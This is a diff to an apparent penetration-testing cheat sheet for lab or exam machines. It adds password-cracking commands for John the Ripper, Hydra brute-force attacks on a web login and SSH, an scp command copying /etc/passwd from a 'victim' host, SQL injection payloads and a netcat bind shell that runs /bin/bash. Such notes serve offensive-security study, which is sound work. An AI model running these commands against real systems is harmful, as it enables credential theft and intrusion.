@@ -215,13 +215,14 @@
 ### Passwords
 - John the Ripper
   - `unshadow passwd shadow > crackme` - Sets the pass/ shadow in a format john will accept to begin cracking on crackme
-  - `john -incremental -users:<list of users or just one EX: Brian> crackme` - Will only attempt specified users instead of going through all. 
-  - `john -wordlist -users:victim1,victim2 crackme` - Uses default wordlist for a dictionary attack
-    - `john -wordlist=/usr/share/wordlist/rockyou.txt -users:vitcim1 crackme` - Using custom wordlists
+  - `john --wordlist=/usr/share/SecLists/Passwords.txt --pot=hashestocrack hashestocrack` - Will overwrite the john pot file in casse you want to run mutlipe attempts on the same file in the same session.
+  - `john --incremental --users:<list of users or just one EX: Brian> crackme` - NOTE: Incremental is not meant to be used with a wordlist and will attempt typical bruteforce. Will only attempt specified users instead of going through all. 
+  - `john --wordlist --users:victim1,victim2 crackme` - Uses default wordlist for a dictionary attack
+    - `john --wordlist=/usr/share/wordlist/rockyou.txt --users:vitcim1 crackme` - Using custom wordlists
     
   
 ### Helpful Commands
-- `nmap -sn 10.10.10.22/24 | grep -oP '(?<=Nmap scan report for )[^ ]*'` Clean nmap ping sweep
+- `nmap -sn 10.10.10.22/24 | grep -oP '(?<=Nmap scan report for )[^ ]*'` Clean nmap ping sweep - WARNING: can omit some alive hosts out
 - `nc -v 127.0.0.1 8888` will let us contact a listening port on the target adress here localhost. This is not to be confused with the listener we typical use in reverse shells `nc nvlp 8888`. The first command is used to call the second command and establish connection.
 - For a simple shell if target host has nc:
   - On target host: `nc -nvlp 1337 -e /bin/bash` where `-e` executes any command.
@@ -234,8 +235,10 @@
     - EX: User if user() = root@localhost is signed into the DB, we can check that:
       - `SELECT substring(user(), 1, 1)` Returns `1` if root is signed in
   - `user()` - Tells us current user logged into the DB
+- Hydra
+  - HTTP-POST login dictionary `hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/wordlist.txt -P /usr/share/passList.txt -f -V`, where flag `-f` is to stop the attack as soon as we find one successful result,
+  - SSH Attack `hydra 10.10.10.222 ssh -L /usr/share/userList.txt -P /usr/share/passList.txt -f -V`
   
-
 
     
 ### Good to Know
@@ -243,6 +246,7 @@
   - Headers
   - Cookies
   - POST: Helps circumvent client-side input validation
+- Use scp to download files to our local machine: `scp root@10.10.10.222:/etc/passwd .` - where root=victim along with the victim ip
 - SQLi can also allow us to nuke DBs where we are allowed to delete things, insert a true statement and the DB will be nuked.
  - UNION SQLi is faster and is less prone to crashing the system. So when running SQLMap, try to select a technique instead of the leaving it empty which can possibly crash the target host
  - A full dump can also crash the system, so dump only specific tables/ columns to be less noisy
@@ -253,16 +257,13 @@
   - Adding a basic auth can also bring up more results `-U` in gobuster, and in dirb: `dirb http://targetsite.site -u "admin:password"`
   - `-x txt,php,/` to include directories with the file extensions search in gobuster
 
-
-
-  
-  
-
-
-
-
-
-
-
-
+Important Last Minute Reminders: 
+- Make sure to keep your machine's new ip when scanning. As dumb as it might sound, it can trip you up after a few boxes. 
+- To see just successful ports with an egresscheck:
+  - `tcp.seq==1 and tcp.ack==1` - fast way to filter outbound requests during an egresscheck, **after** capturing the traffic with wireshark, etc.
+- When doing a scan, if a host has **ALL** ports closed, it's a **CLIENT** 
+- When scanning for service versions, to get more information about the operating system and such, grab the banner for that open port.
+- If SQLi does not work right away, try appending commends instead of using a boolean:
+  - Instead of `page?id=21' or 1=1 -- -`, insert the next statement directly, `page?id=21 AND SELECT ...`
+- If a specific dictionary list is giving you troubles with Hydra-particularly, check if the list has a comment on top and remove it.
 
